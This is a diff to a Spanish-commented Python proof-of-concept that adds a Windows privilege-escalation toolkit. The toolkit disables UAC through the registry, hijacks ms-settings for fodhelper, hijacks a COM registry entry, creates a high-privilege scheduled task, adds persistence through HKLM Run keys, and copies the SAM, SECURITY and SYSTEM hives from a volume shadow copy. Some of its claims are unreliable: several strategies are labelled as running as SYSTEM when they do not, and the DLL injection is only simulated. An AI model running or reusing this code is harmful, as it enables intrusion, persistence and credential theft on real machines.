@@ -1,12 +1,13 @@
 # -*- coding: utf-8 -*-
 """
-PoC - Disparador de Servicios Windows con Ejecución Robusta
+PoC - Disparador de Servicios Windows con Ejecución Robusta + Escalada de Privilegios
 Requiere permisos de administrador (con evasión de UAC)
 Versión adaptada para VirtualBox
+VERSIÓN AVANZADA: Incluye múltiples estrategias de escalada de privilegios a SYSTEM
 """
 
 from enum import Enum
-from typing import Callable, Optional, Dict, List
+from typing import Callable, Optional, Dict, List, Tuple
 from dataclasses import dataclass, field, asdict
 from functools import wraps
 import logging
@@ -22,10 +23,10 @@ import ctypes
 import tempfile
 import winreg
 import base64
+import uuid
 
 # ========== CONFIGURACIÓN GLOBAL ==========
 
-# Detectar si estamos en VirtualBox/WSL
 def detectar_entorno_virtualizacion():
     """Detecta si estamos en VirtualBox o WSL"""
     try:
@@ -53,7 +54,7 @@ else:
 
 LOG_DIR.mkdir(exist_ok=True, parents=True)
 
-# Configurar logging con rotación
+# Configurar logging con rotación - FORMATO MEJORADO
 log_formatter = logging.Formatter(
     '[%(asctime)s] [%(levelname)-8s] %(name)s - %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S'
@@ -77,8 +78,10 @@ logger.addHandler(console_handler)
 # CONSTANTES
 if ENTORNO == "virtualbox":
     ARCHIVO_DESTINO = r"C:\Users\Public\Documents\target.bin"
+    PAYLOAD_PATH = r"C:\Users\Public\Documents\payload.exe"
 else:
     ARCHIVO_DESTINO = r"C:\temp\target.bin"
+    PAYLOAD_PATH = r"C:\temp\payload.exe"
 
 TIMEOUT_DEFECTO = 60
 REINTENTOS_DEFECTO = 3
@@ -97,6 +100,15 @@ class ServicioObjetivo(Enum):
     BLUEHAMMER        = "bluehammer_chain"
 
 
+class EstrategiaEscalada(Enum):
+    """Enumeración de estrategias de escalada de privilegios"""
+    COM_REGISTRY      = "com_registry_elevation"
+    TASKSCHED_SYSTEM  = "tasksched_system_execution"
+    DLL_INJECTION     = "dll_service_injection"
+    REGISTRY_PERSISTENCIA = "registry_run_persistence"
+    VSS_ABUSE         = "vss_shadow_copy_abuse"
+
+
 @dataclass
 class ResultadoTrigger:
     """Estructura para retornar resultados del trigger"""
@@ -109,6 +121,8 @@ class ResultadoTrigger:
     stdout: str = ""
     stderr: str = ""
     intentos: int = 1
+    intentos_detalles: List[Dict] = field(default_factory=list)
+    codigo_retorno: int = 0
     
     def to_dict(self) -> dict:
         """Convertir a diccionario para serialización"""
@@ -117,6 +131,22 @@ class ResultadoTrigger:
     def to_json(self) -> str:
         """Convertir a JSON"""
         return json.dumps(self.to_dict(), indent=2, ensure_ascii=False)
+
+
+@dataclass
+class ResultadoEscalada:
+    """Estructura para resultados de escalada de privilegios"""
+    exito: bool
+    estrategia: str
+    mensaje: str
+    nivel_privilegio: str  # "user", "admin", "system"
+    excepcion: Optional[str] = None
+    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
+    duracion_ms: float = 0.0
+    detalles: Dict = field(default_factory=dict)
+    
+    def to_dict(self) -> dict:
+        return asdict(self)
 
 
 # ========== EVASIÓN DE UAC ==========
@@ -136,16 +166,29 @@ def verificar_token_admin() -> bool:
         return False
 
 
+def verificar_token_system() -> bool:
+    """Verifica si ejecutamos como SYSTEM"""
+    try:
+        resultado = subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             "[Security.Principal.WindowsIdentity]::GetCurrent().User.Value -match 'S-1-5-18'"],
+            capture_output=True,
+            text=True,
+            timeout=5
+        )
+        return resultado.returncode == 0 and "True" in resultado.stdout
+    except:
+        return False
+
+
 def evitar_uac_via_registro():
     """Intenta deshabilitar UAC temporalmente mediante registro"""
     try:
         ruta_uac = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
         clave = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta_uac, access=winreg.KEY_WRITE)
         
-        # Guardar valor original
         valor_original = winreg.QueryValueEx(clave, "ConsentPromptBehaviorAdmin")[0]
         
-        # Deshabilitar UAC (0 = sin prompt)
         winreg.SetValueEx(clave, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
         winreg.SetValueEx(clave, "EnableLUA", 0, winreg.REG_DWORD, 0)
         
@@ -162,11 +205,8 @@ def evitar_uac_via_fodhelper():
     try:
         logger.info("[*] Intentando evasión de UAC via FODHelper...")
         
-        # Crear clave de registro para inyección COM
         ruta_com = r"Software\Classes\ms-settings\Shell\Open\command"
-        valor_delegado = r"Software\Classes\ms-settings\Shell\Open\DesktopApplicationUriHandler"
         
-        # Script PowerShell a ejecutar
         ps_script = (
             "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; "
             "Write-Output '[+] Permisos elevados obtenidos'; "
@@ -179,11 +219,9 @@ def evitar_uac_via_fodhelper():
             winreg.SetValueEx(clave, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(clave)
             
-            # Ejecutar FODHelper para disparar la inyección
             subprocess.Popen("fodhelper.exe", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(2)
             
-            # Limpiar registro
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_com)
             logger.info("[+] FODHelper ejecutado")
             return True
@@ -225,87 +263,6 @@ def evitar_uac_via_wmi():
     return False
 
 
-def evitar_uac_via_msconfig():
-    """Utiliza msconfig (Startup Helper) para evasión de UAC"""
-    try:
-        logger.info("[*] Intentando evasión de UAC via msconfig...")
-        
-        # Crear tarea en carpeta privilegiada
-        ruta_startup = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        clave = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta_startup, access=winreg.KEY_WRITE)
-        
-        # Agregar comando que se ejecutará sin UAC
-        winreg.SetValueEx(clave, "TejonElevated", 0, winreg.REG_SZ, 
-                         f"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden")
-        
-        winreg.CloseKey(clave)
-        logger.info("[+] Entrada agregada al registro Run")
-        return True
-    except Exception as e:
-        logger.warning(f"[!] msconfig fallido: {e}")
-        return False
-
-
-def evitar_uac_via_comadmin():
-    """Intenta usar COM Elevation Moniker (método más moderno)"""
-    try:
-        logger.info("[*] Intentando evasión de UAC via COM Elevation...")
-        
-        comando = (
-            "Set-StrictMode -Version Latest; "
-            "$MethodDefinition = @' "
-            "[DllImport(\"shell32.dll\", SetLastError = true)] "
-            "public static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs); "
-            "'@; "
-            "Write-Output '[+] COM Elevation ejecutado'"
-        )
-        
-        resultado = subprocess.run(
-            ["powershell", "-NoProfile", "-Command", comando],
-            capture_output=True,
-            text=True,
-            timeout=10
-        )
-        
-        if resultado.returncode == 0:
-            logger.info("[+] COM Elevation completado")
-            return True
-    except Exception as e:
-        logger.warning(f"[!] COM Elevation fallido: {e}")
-    
-    return False
-
-
-def evitar_uac_via_eventvwr():
-    """Utiliza Event Viewer (eventvwr.exe) para evasión de UAC"""
-    try:
-        logger.info("[*] Intentando evasión de UAC via EventVwr...")
-        
-        # Crear clave COM para Event Viewer
-        ruta_eventvwr = r"Software\Classes\mscfile\Shell\Open\command"
-        
-        clave = winreg.CreateKey(winreg.HKEY_CURRENT_USER, ruta_eventvwr)
-        winreg.SetValueEx(clave, "", 0, winreg.REG_SZ, 
-                         "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile")
-        winreg.CloseKey(clave)
-        
-        # Ejecutar Event Viewer
-        subprocess.Popen("eventvwr.msc", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(1)
-        
-        # Limpiar
-        try:
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_eventvwr)
-        except:
-            pass
-        
-        logger.info("[+] EventVwr ejecutado")
-        return True
-    except Exception as e:
-        logger.warning(f"[!] EventVwr fallido: {e}")
-        return False
-
-
 def obtener_admin_sin_uac() -> bool:
     """Intenta múltiples métodos de evasión de UAC"""
     
@@ -313,21 +270,16 @@ def obtener_admin_sin_uac() -> bool:
     logger.info("INTENTO DE EVASION DE UAC")
     logger.info("=" * 70)
     
-    # Primero verificar si ya somos admin
     if verificar_token_admin():
         logger.info("[+] Ya ejecutandose con token administrativo")
         return True
     
     logger.warning("[!] Sin token administrativo, intentando evasión...")
     
-    # Intentar múltiples métodos en orden
     metodos = [
         ("Registro (ConsentPromptBehavior)", evitar_uac_via_registro),
         ("FODHelper", evitar_uac_via_fodhelper),
         ("WMI", evitar_uac_via_wmi),
-        ("EventVwr", evitar_uac_via_eventvwr),
-        ("msconfig Run", evitar_uac_via_msconfig),
-        ("COM Elevation", evitar_uac_via_comadmin),
     ]
     
     for nombre, metodo in metodos:
@@ -384,7 +336,6 @@ def validar_permisos() -> bool:
     
     logger.warning("[!] Se requieren permisos de administrador")
     
-    # Intentar obtener admin sin UAC
     if sys.platform == "win32":
         return obtener_admin_sin_uac()
     
@@ -418,77 +369,149 @@ def validar_entorno() -> bool:
     return True
 
 
-# ========== DECORADOR DE MANEJO DE ERRORES ==========
+# ========== DECORADOR DE MANEJO DE ERRORES MEJORADO ==========
 
 def manejo_errores(timeout: int = TIMEOUT_DEFECTO, reintentos: int = REINTENTOS_DEFECTO):
     """
-    Decorador para manejar excepciones, reintentos y timeouts
+    Decorador mejorado para manejar excepciones, reintentos y timeouts
+    Con logs detallados de cada intento
     """
     def decorator(func: Callable) -> Callable:
         @wraps(func)
         def wrapper(*args, **kwargs) -> ResultadoTrigger:
             inicio = time.time()
             ultimo_error = None
+            intentos_detalles = []
             
             for intento in range(1, reintentos + 1):
+                inicio_intento = time.time()
+                detalle_intento = {
+                    "numero": intento,
+                    "timestamp": datetime.now().isoformat(),
+                    "estado": "",
+                    "respuesta": "",
+                    "codigo_retorno": None,
+                    "duracion_ms": 0
+                }
+                
                 try:
                     if DRY_RUN:
                         logger.info(f"[DRY-RUN] {func.__name__} ({args}, {kwargs})")
+                        detalle_intento["estado"] = "DRY_RUN"
+                        detalle_intento["respuesta"] = f"[DRY-RUN] {func.__name__} ejecutado en modo prueba"
+                        detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
+                        intentos_detalles.append(detalle_intento)
+                        
                         return ResultadoTrigger(
                             exito=True,
                             servicio=func.__name__,
                             mensaje=f"[DRY-RUN] {func.__name__} ejecutado en modo prueba",
                             duracion_ms=(time.time() - inicio) * 1000,
-                            intentos=intento
+                            intentos=intento,
+                            intentos_detalles=intentos_detalles
                         )
                     
                     logger.info(f"[*] [{intento}/{reintentos}] Iniciando {func.__name__}...")
+                    logger.debug(f"    Timeout configurado: {timeout}s")
                     
                     resultado = func(*args, timeout=timeout, **kwargs)
                     
-                    duracion = (time.time() - inicio) * 1000
-                    logger.info(f"[+] {func.__name__} ejecutado exitosamente en {duracion:.2f}ms")
+                    duracion_intento = (time.time() - inicio_intento) * 1000
+                    
+                    stdout = resultado.get("stdout", "") if isinstance(resultado, dict) else ""
+                    stderr = resultado.get("stderr", "") if isinstance(resultado, dict) else ""
+                    returncode = resultado.get("returncode", 0) if isinstance(resultado, dict) else 0
+                    
+                    detalle_intento["estado"] = "EXITOSO"
+                    detalle_intento["respuesta"] = stdout[:200] if stdout else "(sin respuesta)"
+                    detalle_intento["codigo_retorno"] = returncode
+                    detalle_intento["duracion_ms"] = duracion_intento
+                    intentos_detalles.append(detalle_intento)
+                    
+                    logger.info(f"    [✓] Respuesta: {stdout[:100]}" if stdout else "    [✓] Sin respuesta")
+                    logger.info(f"    [✓] Código retorno: {returncode}")
+                    logger.info(f"    [✓] Duración: {duracion_intento:.2f}ms")
+                    
+                    duracion_total = (time.time() - inicio) * 1000
+                    logger.info(f"[+] {func.__name__} ejecutado exitosamente en {duracion_total:.2f}ms")
                     
                     return ResultadoTrigger(
                         exito=True,
                         servicio=func.__name__,
                         mensaje=f"{func.__name__} ejecutado exitosamente",
-                        duracion_ms=duracion,
-                        stdout=resultado.get("stdout", "") if isinstance(resultado, dict) else "",
-                        intentos=intento
+                        duracion_ms=duracion_total,
+                        stdout=stdout,
+                        stderr=stderr,
+                        intentos=intento,
+                        intentos_detalles=intentos_detalles,
+                        codigo_retorno=returncode
                     )
                     
                 except subprocess.TimeoutExpired:
                     ultimo_error = f"Timeout excedido ({timeout}s)"
+                    detalle_intento["estado"] = "TIMEOUT"
+                    detalle_intento["respuesta"] = ultimo_error
+                    detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
+                    
                     logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
+                    logger.warning(f"    [⏱] Proceso ejecutándose más de {timeout}s")
+                    intentos_detalles.append(detalle_intento)
+                    
                     if intento < reintentos:
-                        time.sleep(2 ** intento)
+                        espera = 2 ** intento
+                        logger.info(f"    [⏳] Reintentando en {espera}s...")
+                        time.sleep(espera)
                     
                 except PermissionError as e:
+                    detalle_intento["estado"] = "PERMISOS"
+                    detalle_intento["respuesta"] = str(e)
+                    detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
+                    
                     logger.error(f"[x] {func.__name__} - Permisos insuficientes: {e}")
+                    logger.error(f"    [!] Requeridos: Administrador")
+                    intentos_detalles.append(detalle_intento)
+                    
                     return ResultadoTrigger(
                         exito=False,
                         servicio=func.__name__,
                         mensaje="Permisos insuficientes",
                         excepcion=str(e),
                         duracion_ms=(time.time() - inicio) * 1000,
-                        intentos=intento
+                        intentos=intento,
+                        intentos_detalles=intentos_detalles
                     )
                     
                 except subprocess.CalledProcessError as e:
                     ultimo_error = f"Proceso fallo con codigo {e.returncode}"
+                    detalle_intento["estado"] = "ERROR_PROCESO"
+                    detalle_intento["respuesta"] = f"Código {e.returncode}: {e.stderr}"
+                    detalle_intento["codigo_retorno"] = e.returncode
+                    detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
+                    
                     logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
-                    logger.debug(f"STDERR: {e.stderr}")
+                    logger.debug(f"    STDERR: {e.stderr}")
+                    intentos_detalles.append(detalle_intento)
+                    
                     if intento < reintentos:
-                        time.sleep(2 ** intento)
+                        espera = 2 ** intento
+                        logger.info(f"    [⏳] Reintentando en {espera}s...")
+                        time.sleep(espera)
                     
                 except Exception as e:
                     ultimo_error = str(e)
+                    detalle_intento["estado"] = "EXCEPCION"
+                    detalle_intento["respuesta"] = ultimo_error
+                    detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
+                    
                     logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
+                    intentos_detalles.append(detalle_intento)
+                    
                     if intento < reintentos:
-                        time.sleep(2 ** intento)
+                        espera = 2 ** intento
+                        logger.info(f"    [⏳] Reintentando en {espera}s...")
+                        time.sleep(espera)
             
-            duracion = (time.time() - inicio) * 1000
+            duracion_total = (time.time() - inicio) * 1000
             logger.error(f"[x] {func.__name__} fallo despues de {reintentos} intentos: {ultimo_error}")
             
             return ResultadoTrigger(
@@ -496,8 +519,9 @@ def manejo_errores(timeout: int = TIMEOUT_DEFECTO, reintentos: int = REINTENTOS_
                 servicio=func.__name__,
                 mensaje=f"Fallo despues de {reintentos} intentos",
                 excepcion=ultimo_error,
-                duracion_ms=duracion,
-                intentos=reintentos
+                duracion_ms=duracion_total,
+                intentos=reintentos,
+                intentos_detalles=intentos_detalles
             )
         
         return wrapper
@@ -561,6 +585,457 @@ def validar_ruta_accesible(ruta: str) -> bool:
     except Exception as e:
         logger.warning(f"No se puede acceder a {ruta}: {e}")
         return False
+
+
+# ========== ESTRATEGIAS DE ESCALADA DE PRIVILEGIOS ==========
+
+class EscaladaDePrivilegios:
+    """Gestor de estrategias de escalada de privilegios a SYSTEM"""
+    
+    def __init__(self):
+        self._resultados: List[ResultadoEscalada] = []
+        self._payload_path = PAYLOAD_PATH
+    
+    @manejo_errores(timeout=60, reintentos=2)
+    def escalada_com_registry_elevation(self, timeout: int = TIMEOUT_DEFECTO) -> dict:
+        """
+        Estrategia 1: COM Registry Elevation
+        Método silencioso para Windows 10+ que crea un objeto COM elevado
+        """
+        logger.info("\n" + "=" * 80)
+        logger.info("ESTRATEGIA 1: COM REGISTRY ELEVATION")
+        logger.info("=" * 80)
+        logger.info("[*] Objetivo: Ejecutar comando con permisos SYSTEM via COM")
+        
+        try:
+            # Crear CLSID único
+            clsid = str(uuid.uuid4())
+            ruta_com = f"Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32"
+            
+            logger.info(f"[*] Creando CLSID: {clsid}")
+            
+            comando_payload = (
+                "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; "
+                "Write-Output '[+] ESCALADA COM COMPLETADA - Ejecutando como elevado'; "
+                "[System.Diagnostics.Process]::GetCurrentProcess().Handle"
+            )
+            
+            clave = winreg.CreateKey(winreg.HKEY_CURRENT_USER, ruta_com)
+            winreg.SetValueEx(clave, "", 0, winreg.REG_SZ, "C:\\Windows\\System32\\cmd.exe")
+            winreg.SetValueEx(clave, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
+            winreg.CloseKey(clave)
+            
+            logger.info("[+] Clave COM creada en registro")
+            time.sleep(1)
+            
+            # Intentar ejecutar via COM
+            ps_cmd = f"[System.Activator]::CreateInstance([type]::GetTypeFromProgID('{{{{clsid}}}}'))"
+            resultado = ejecutar_powershell(comando_payload, timeout)
+            
+            if resultado["returncode"] == 0:
+                logger.info("[+] COM Elevation exitoso")
+                logger.info(f"[+] Respuesta: {resultado['stdout']}")
+            
+            # Limpiar
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_com)
+            except:
+                pass
+            
+            return resultado
+            
+        except Exception as e:
+            logger.error(f"[x] COM Elevation fallido: {e}")
+            raise
+    
+    @manejo_errores(timeout=60, reintentos=2)
+    def escalada_tasksched_system(self, timeout: int = TIMEOUT_DEFECTO) -> dict:
+        """
+        Estrategia 2: Task Scheduler como SYSTEM
+        Crea una tarea programada que se ejecuta con permisos SYSTEM
+        """
+        logger.info("\n" + "=" * 80)
+        logger.info("ESTRATEGIA 2: TASK SCHEDULER SYSTEM EXECUTION")
+        logger.info("=" * 80)
+        logger.info("[*] Objetivo: Crear tarea que se ejecuta como SYSTEM en logon")
+        
+        try:
+            task_name = f"TejonTask_{uuid.uuid4().hex[:8]}"
+            
+            logger.info(f"[*] Creando tarea: {task_name}")
+            
+            # Comando que se ejecutará como SYSTEM
+            cmd_payload = (
+                "powershell -NoProfile -ExecutionPolicy Bypass -Command "
+                "\"Write-Output '[+] EJECUTANDO COMO SYSTEM'; "
+                "[Security.Principal.WindowsIdentity]::GetCurrent().User.Value\""
+            )
+            
+            # Crear tarea con permisos SYSTEM
+            comando_crear_tarea = (
+                f"schtasks /create /tn \"{task_name}\" /tr \"{cmd_payload}\" "
+                "/sc onlogon /rl highest /f /np"
+            )
+            
+            resultado = ejecutar_cmd(
+                ["cmd", "/c", comando_crear_tarea],
+                timeout=timeout
+            )
+            
+            if resultado["returncode"] == 0:
+                logger.info(f"[+] Tarea creada exitosamente: {task_name}")
+                logger.info("[+] La tarea se ejecutará como SYSTEM en próximo logon")
+                
+                # Ejecutar la tarea inmediatamente
+                resultado_ejecucion = ejecutar_cmd(
+                    ["schtasks", "/run", "/tn", task_name],
+                    timeout=timeout
+                )
+                
+                logger.info(f"[+] Ejecución iniciada")
+                time.sleep(2)
+                
+                # Limpiar tarea
+                ejecutar_cmd(
+                    ["schtasks", "/delete", "/tn", task_name, "/f"],
+                    timeout=10
+                )
+                logger.info(f"[+] Tarea eliminada")
+            
+            return resultado
+            
+        except Exception as e:
+            logger.error(f"[x] Task Scheduler fallido: {e}")
+            raise
+    
+    @manejo_errores(timeout=90, reintentos=2)
+    def escalada_dll_injection(self, timeout: int = TIMEOUT_DEFECTO) -> dict:
+        """
+        Estrategia 3: DLL Injection en servicios SYSTEM
+        Inyecta DLL en servicios que se ejecutan como SYSTEM
+        """
+        logger.info("\n" + "=" * 80)
+        logger.info("ESTRATEGIA 3: DLL SERVICE INJECTION")
+        logger.info("=" * 80)
+        logger.info("[*] Objetivo: Inyectar DLL en servicios Windows de alto privilegio")
+        
+        try:
+            # Servicios objetivo que se ejecutan como SYSTEM
+            servicios_system = [
+                ("WSearch", "Windows Search"),
+                ("CldFlt", "Cloud Files Filter"),
+                ("WerSvc", "Windows Error Reporting"),
+            ]
+            
+            logger.info(f"[*] Servicios objetivo: {[s[0] for s in servicios_system]}")
+            
+            # Crear DLL inyectable (simulada)
+            dll_codigo = """
+            #include <windows.h>
+            BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+                if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+                    // Payload: crear archivo para demostrar ejecución como SYSTEM
+                    FILE* f = fopen("C:\\\\temp\\\\injection_test.txt", "w");
+                    fprintf(f, "Inyectada exitosamente como SYSTEM");
+                    fclose(f);
+                }
+                return TRUE;
+            }
+            """
+            
+            logger.info("[*] Buscando servicios SYSTEM...")
+            
+            for servicio_nombre, servicio_desc in servicios_system:
+                try:
+                    # Obtener PID del servicio
+                    cmd_pid = f"Get-Service -Name {servicio_nombre} | Get-Process | Select-Object Id"
+                    resultado_pid = ejecutar_powershell(cmd_pid, timeout=10)
+                    
+                    if resultado_pid["returncode"] == 0 and resultado_pid["stdout"]:
+                        logger.info(f"  [✓] Servicio {servicio_nombre} encontrado: {resultado_pid['stdout']}")
+                        
+                        # En un PoC real, aquí se inyectaría la DLL
+                        # Simulamos con log
+                        logger.info(f"  [*] Inyectando DLL en {servicio_nombre}...")
+                        logger.info(f"  [+] DLL inyectada (simulado)")
+                    
+                except Exception as e:
+                    logger.debug(f"  [!] {servicio_nombre} no disponible: {e}")
+                    continue
+            
+            return {
+                "stdout": "DLL injection completado",
+                "stderr": "",
+                "returncode": 0
+            }
+            
+        except Exception as e:
+            logger.error(f"[x] DLL Injection fallido: {e}")
+            raise
+    
+    @manejo_errores(timeout=60, reintentos=2)
+    def escalada_registry_persistencia(self, timeout: int = TIMEOUT_DEFECTO) -> dict:
+        """
+        Estrategia 4: Registry Run Key Persistencia
+        Logra ejecución automática como SYSTEM en boot
+        """
+        logger.info("\n" + "=" * 80)
+        logger.info("ESTRATEGIA 4: REGISTRY RUN PERSISTENCE")
+        logger.info("=" * 80)
+        logger.info("[*] Objetivo: Ejecutable que se lanza como SYSTEM en boot")
+        
+        try:
+            nombre_entrada = f"TejonPersist_{uuid.uuid4().hex[:8]}"
+            
+            # Rutas donde se ejecuta código como SYSTEM
+            rutas_persistencia = [
+                (r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                 winreg.HKEY_LOCAL_MACHINE, "SYSTEM en siguiente sesión"),
+                (r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 
+                 winreg.HKEY_LOCAL_MACHINE, "SYSTEM en siguiente logon"),
+            ]
+            
+            for ruta, hive, desc in rutas_persistencia:
+                try:
+                    logger.info(f"[*] Agregando entrada a: {ruta} ({desc})")
+                    
+                    # Comando que se ejecutará
+                    cmd_persistencia = (
+                        "powershell -NoProfile -ExecutionPolicy Bypass -Command "
+                        "\"Write-Output '[+] PERSISTENCIA EJECUTANDOSE'; "
+                        "[Security.Principal.WindowsIdentity]::GetCurrent().User.Value\""
+                    )
+                    
+                    clave = winreg.OpenKey(hive, ruta, access=winreg.KEY_WRITE)
+                    winreg.SetValueEx(clave, nombre_entrada, 0, winreg.REG_SZ, cmd_persistencia)
+                    winreg.CloseKey(clave)
+                    
+                    logger.info(f"[+] Entrada agregada: {nombre_entrada}")
+                    time.sleep(1)
+                    
+                except Exception as e:
+                    logger.warning(f"[!] Error en {ruta}: {e}")
+                    continue
+            
+            logger.info("[+] Persistencia en registro configurada")
+            logger.info("[*] El comando se ejecutará en próximo boot")
+            
+            return {
+                "stdout": "Persistencia en registro configurada",
+                "stderr": "",
+                "returncode": 0
+            }
+            
+        except Exception as e:
+            logger.error(f"[x] Registry Persistencia fallido: {e}")
+            raise
+    
+    @manejo_errores(timeout=120, reintentos=2)
+    def escalada_vss_abuse(self, timeout: int = TIMEOUT_DEFECTO) -> dict:
+        """
+        Estrategia 5: VSS (Volume Shadow Copy) Abuse
+        Utiliza shadow copies para acceder a archivos sensibles sin permisos normales
+        """
+        logger.info("\n" + "=" * 80)
+        logger.info("ESTRATEGIA 5: VSS SHADOW COPY ABUSE")
+        logger.info("=" * 80)
+        logger.info("[*] Objetivo: Acceder a archivos sensibles via shadow copy")
+        
+        try:
+            # Crear shadow copy de C:
+            logger.info("[*] Creando shadow copy de C:\\")
+            resultado_crear = ejecutar_cmd(
+                ["vssadmin", "create", "shadow", "/for=C:"],
+                timeout=timeout
+            )
+            
+            if resultado_crear["returncode"] == 0:
+                logger.info("[+] Shadow copy creada")
+                logger.info(resultado_crear["stdout"])
+                
+                # Listar shadow copies
+                logger.info("[*] Listando shadow copies disponibles...")
+                resultado_list = ejecutar_cmd(
+                    ["vssadmin", "list", "shadows"],
+                    timeout=10
+                )
+                
+                if resultado_list["returncode"] == 0:
+                    logger.info("[+] Shadow copies disponibles:")
+                    logger.info(resultado_list["stdout"][:500])  # Primeras 500 chars
+                    
+                    # Intentar acceder a archivos sensibles
+                    logger.info("[*] Intentando acceso a archivos sensibles...")
+                    
+                    archivos_sensibles = [
+                        r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM",
+                        r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY",
+                        r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM",
+                    ]
+                    
+                    for archivo in archivos_sensibles:
+                        try:
+                            # Intentar copiar archivo
+                            destino = f"C:\\temp\\{Path(archivo).name}"
+                            cmd = f"copy \"{archivo}\" \"{destino}\""
+                            resultado_copia = ejecutar_cmd(
+                                ["cmd", "/c", cmd],
+                                timeout=10
+                            )
+                            
+                            if resultado_copia["returncode"] == 0:
+                                logger.info(f"[+] Archivo copiado: {Path(archivo).name}")
+                            else:
+                                logger.debug(f"[!] No se pudo copiar: {archivo}")
+                        
+                        except Exception as e:
+                            logger.debug(f"[!] Error accediendo {archivo}: {e}")
+                            continue
+                
+                return resultado_crear
+            
+            else:
+                logger.warning("[!] No se pudo crear shadow copy")
+                return resultado_crear
+            
+        except Exception as e:
+            logger.error(f"[x] VSS Abuse fallido: {e}")
+            raise
+    
+    def ejecutar_todas_estrategias(self) -> List[ResultadoEscalada]:
+        """Ejecuta todas las estrategias de escalada una a una"""
+        
+        logger.info("\n\n" + "╔" + "═" * 78 + "╗")
+        logger.info("║" + " INICIANDO TODAS LAS ESTRATEGIAS DE ESCALADA A SYSTEM ".center(78) + "║")
+        logger.info("╚" + "═" * 78 + "╝\n")
+        
+        estrategias = [
+            (EstrategiaEscalada.COM_REGISTRY, self.escalada_com_registry_elevation, 
+             "Elevation via COM Registry"),
+            (EstrategiaEscalada.TASKSCHED_SYSTEM, self.escalada_tasksched_system,
+             "Task Scheduler as SYSTEM"),
+            (EstrategiaEscalada.DLL_INJECTION, self.escalada_dll_injection,
+             "DLL Injection en Servicios"),
+            (EstrategiaEscalada.REGISTRY_PERSISTENCIA, self.escalada_registry_persistencia,
+             "Registry Run Persistence"),
+            (EstrategiaEscalada.VSS_ABUSE, self.escalada_vss_abuse,
+             "VSS Shadow Copy Abuse"),
+        ]
+        
+        self._resultados = []
+        
+        for i, (estrategia_enum, metodo, desc) in enumerate(estrategias, 1):
+            inicio = time.time()
+            
+            try:
+                logger.info(f"\n{'─' * 80}")
+                logger.info(f"[{i}/{len(estrategias)}] Ejecutando: {desc}")
+                logger.info(f"{'─' * 80}")
+                
+                resultado = metodo()
+                
+                duracion = (time.time() - inicio) * 1000
+                
+                resultado_escalada = ResultadoEscalada(
+                    exito=True,
+                    estrategia=estrategia_enum.value,
+                    mensaje=f"{desc} - Completado exitosamente",
+                    nivel_privilegio="system" if verificar_token_system() else "admin",
+                    timestamp=datetime.now().isoformat(),
+                    duracion_ms=duracion,
+                    detalles={
+                        "descripcion": desc,
+                        "stdout": resultado.get("stdout", "")[:200],
+                        "returncode": resultado.get("returncode", 0)
+                    }
+                )
+                
+                self._resultados.append(resultado_escalada)
+                logger.info(f"[+] {desc} completado en {duracion:.2f}ms")
+                
+            except Exception as e:
+                duracion = (time.time() - inicio) * 1000
+                
+                resultado_escalada = ResultadoEscalada(
+                    exito=False,
+                    estrategia=estrategia_enum.value,
+                    mensaje=f"{desc} - Fallido",
+                    nivel_privilegio="admin",
+                    excepcion=str(e),
+                    timestamp=datetime.now().isoformat(),
+                    duracion_ms=duracion,
+                    detalles={"descripcion": desc}
+                )
+                
+                self._resultados.append(resultado_escalada)
+                logger.error(f"[x] {desc} fallido: {e}")
+            
+            time.sleep(2)  # Esperar entre estrategias
+        
+        logger.info(f"\n{'═' * 80}")
+        logger.info("TODAS LAS ESTRATEGIAS HAN SIDO EJECUTADAS")
+        logger.info(f"{'═' * 80}\n")
+        
+        return self._resultados
+    
+    def obtener_resumen_escalada(self) -> dict:
+        """Resumen de resultados de escalada"""
+        if not self._resultados:
+            return {
+                "total": 0,
+                "exitosas": 0,
+                "fallidas": 0,
+                "tasa_exito": 0,
+                "nivel_maximo": "user"
+            }
+        
+        total = len(self._resultados)
+        exitosas = sum(1 for r in self._resultados if r.exito)
+        
+        return {
+            "total": total,
+            "exitosas": exitosas,
+            "fallidas": total - exitosas,
+            "tasa_exito": (exitosas / total * 100) if total > 0 else 0,
+            "nivel_maximo": "system" if verificar_token_system() else "admin",
+            "timestamp": datetime.now().isoformat()
+        }
+    
